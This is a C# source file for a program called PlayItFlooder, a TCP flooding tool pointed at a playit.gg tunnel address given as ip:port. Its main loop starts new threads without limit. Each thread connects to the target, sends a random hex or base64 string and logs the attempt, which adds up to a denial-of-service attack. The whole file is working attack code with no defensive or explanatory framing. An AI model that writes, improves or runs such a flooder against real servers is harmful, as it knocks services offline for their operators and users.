using System;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Security.Cryptography;

public class PlayItFlooder
{
    public static string ServerIP = "example.at.ply.gg:2023"; // Format - ip:port
    static void Main()
    {
        try
        {
            int iteration = 0;
            while (true)
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        iteration++;
                        using (TcpClient client = new TcpClient(ServerIP?.Split(':')[0], int.TryParse(ServerIP?.Split(':')[1], out int port) ? port : -1))
                        {
                            client.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                            string rChar = _rand();
                            NetworkStream stream = client.GetStream();
                            byte[] data = Encoding.ASCII.GetBytes(rChar);
                            stream.Write(data, 0, data.Length);
                          
                            Log($"Iteration {iteration}: Connected, Sent: " + rChar.ToString());
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"Error in iteration {iteration}: {ex.Message}");
                    }
                });
                thread.Start();
            }
        }
        catch (Exception ex)
        {
            Log($"Error: {ex.Message}");
        }
    }

    static string _rand() => (new Random()).Next(2) == 0 ? BitConverter.ToString(((Func<byte[]>)(() => { byte[] randomBytes = new byte[16]; new RNGCryptoServiceProvider().GetBytes(randomBytes); return randomBytes; }))()).Replace("-", "").ToLower() : Convert.ToBase64String(((Func<byte[]>)(() => { byte[] randomBytes = new byte[20]; new RNGCryptoServiceProvider().GetBytes(randomBytes); return randomBytes; }))());
    static void Log(string message) => Console.WriteLine($"{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff} - {message}");
}
